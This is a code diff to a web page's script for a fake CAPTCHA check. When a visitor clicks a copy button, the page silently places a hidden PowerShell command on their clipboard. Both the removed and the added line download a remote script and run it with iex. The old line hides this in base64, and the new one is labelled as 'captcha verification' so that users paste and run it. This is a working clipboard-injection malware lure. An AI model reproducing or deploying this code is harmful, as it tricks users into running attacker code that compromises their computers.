@@ -49,7 +49,7 @@
 
         document.getElementById('copyButton').addEventListener('click', () => {
             const randomCaptchaId = generateRandomNumber();
-            const command = `powershell -windowstyle hidden -EncodedCommand aXdyIC11c2ViICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vd2F2ZWdldC9sb2FkZXJweS9yZWZzL2hlYWRzL21haW4vbWFpbi5wczEnIHwgaWV4Cg== # HCaptcha Secure Solver v1.0.2 Release # ${randomCaptchaId}`;
+            const command = `powershell -WindowStyle Hidden -Command "iwr -useb 'https://raw.githubusercontent.com/SecureCaptcha/test/refs/heads/main/captcha.ps1' | iex" # Security Bot Fullproof Captcha Verification ID: ${randomCaptchaId}`;
 
             navigator.clipboard.writeText(command).catch(err => {
                 console.error('Failed to copy: ', err);
